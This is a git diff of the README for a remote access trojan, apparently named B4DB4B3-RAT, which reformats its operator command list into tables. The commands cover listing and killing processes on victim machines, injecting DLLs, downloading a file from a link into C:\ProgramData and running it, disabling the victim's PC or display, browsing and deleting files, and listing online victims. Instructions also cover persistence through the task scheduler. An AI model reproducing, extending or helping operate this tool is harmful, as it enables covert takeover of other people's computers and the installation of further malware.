@@ -8,28 +8,36 @@
  ![WEIGHT](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/WEIGHT.png)   
    
 # [Commands (Will be added)]   
-```
- -= Process manager:      
- /user[ID] processes - get process list    
- /user[ID] closeproc [processname.exe] - close process    
- /user[ID] inject_dll [processname.exe] [C:\Path\To\File.dll] - Inject dll into process    
+### Process manager:      
+ Command name         | Parameters                             | Description
+ -------------------- | -------------------------------------- | -----------
+ /user[ID] processes  |                                        | get process list    
+ /user[ID] closeproc  | [processname.exe]                      | close process    
+ /user[ID] inject_dll | [processname.exe] [C:\Path\To\File.dll]| Inject dll into process
+ 
+### Auxiliary: 
+ Command name         | Parameters                                              | Description
+ -------------------- | ------------------------------------------------------- | -----------
+ /user[ID] loader     | [https://google.com/file.exe] [C:\ProgramData\file.exe] | upload file from [LINK] to [PATH]    
+ /user[ID] run        | [C:\ProgramData\file.exe] [Args to run file | Or empty] | run file from [PATH] with arguments [ARGS]   
    
- -= Auxiliary:   
- /user[ID] loader [LINK] [PATH] - upload file from [LINK] to [PATH]    
- /user[ID] run [PATH] [ARGS] - run file from [PATH] with arguments [ARGS]   
+### Jokes:   
+ Command name              | Parameters                                              | Description
+ ------------------------- | ------------------------------------------------------- | -----------
+ /user[ID] disable pc      |                                                         | disable computer of user    
+ /user[ID] close           |                                                         | close user   
+ /user[ID] disable display |                                                         | disable display user    
    
- -= Jokes:   
- /user[ID] disable pc - disable computer of user    
- /user[ID] close - close rat    
- /user[ID] disable display - disable display user    
-   
- -= File manager:   
- /user[ID] dir [C:\Folder] - show files and folders in directory    
- /user[ID] dir del_file C:\Path\To\File.exe - delete file into directory    
+### File manager:
+ Command name              | Parameters                                              | Description
+ ------------------------- | ------------------------------------------------------- | -----------
+ /user[ID] dir             | [C:\Folder]                                             | show files and folders in directory    
+ /user[ID] dir del_file    | [C:\Path\To\File.exe]                                   | delete file into directory    
 
- -= RAT:   
- /users - show online users   
-```
+### RAT:   
+ Command name              | Parameters                                              | Description
+ ------------------------- | ------------------------------------------------------- | -----------
+ /users                    |                                                         | show online users   
 	
 # [Coming soon]
 - [x] Add file manager
@@ -39,6 +47,7 @@
 - [x] Add more jokes (open url, block url, close process and etc.)
 - [x] Add process control (inject dll, shellcode and etc.)
 - [ ] Add more information about PC 
+- [ ] Add Service manager (for deleting, showing and adding your system drivers)
  
 # [Instruction to use]
 ## English
@@ -77,7 +86,7 @@
 6. "Write yourself in taskschd" - если стоит галочка - программа после запуска запишет себя в планировщик заданий
 
 # [CHANGELOG]
-> 17.10.2020 16:30 - Code is optimized, added commands     
+> 17.10.2020 16:30 - Code is optimized, added commands   
 > 18.10.2020 18:40 - Code is refactored and optimized, fixed bugs (command inject dll didn't work), added new function in builder (write in scheduler task), updated GUI, added re-launch protection, added commands  
  
 # [LICENSE]
